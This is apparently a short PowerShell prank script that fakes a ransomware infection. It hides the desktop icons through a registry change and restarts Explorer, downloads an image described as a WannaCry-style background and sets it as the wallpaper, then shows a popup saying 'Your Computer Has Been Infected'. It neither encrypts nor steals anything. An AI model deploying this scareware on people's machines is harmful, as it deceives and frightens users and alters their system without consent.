#Hides Desktop Icons
$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
Get-Process "explorer"| Stop-Process

#Changes Background  
#URL For the Image of your choice (Wanna Cry Ransomware Background)
$url = "https://c4.wallpaperflare.com/wallpaper/553/61/171/5k-black-hd-mockup-wallpaper-preview.jpg"


Invoke-WebRequest $url -OutFile C:\temp\test.jpg


$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc

[Wallpaper]::SetWallpaper("C:\temp\test.jpg")


#Pop Up Message

function MsgBox {

[CmdletBinding()]
param (	
[Parameter (Mandatory = $True)]
[Alias("m")]
[string]$message,

[Parameter (Mandatory = $False)]
[Alias("t")]
[string]$title,

[Parameter (Mandatory = $False)]
[Alias("b")]
[ValidateSet('OK','OKCancel','YesNoCancel','YesNo')]
[string]$button,

[Parameter (Mandatory = $False)]
[Alias("i")]
[ValidateSet('None','Hand','Question','Warning','Asterisk')]
[string]$image
)

Add-Type -AssemblyName PresentationCore,PresentationFramework

if (!$title) {$title = " "}
if (!$button) {$button = "OK"}
if (!$image) {$image = "None"}

[System.Windows.MessageBox]::Show($message,$title,$button,$image)

}

MsgBox -m 'Your Computer Has Been Infected' -t "Warning" -b OKCancel -i Warning
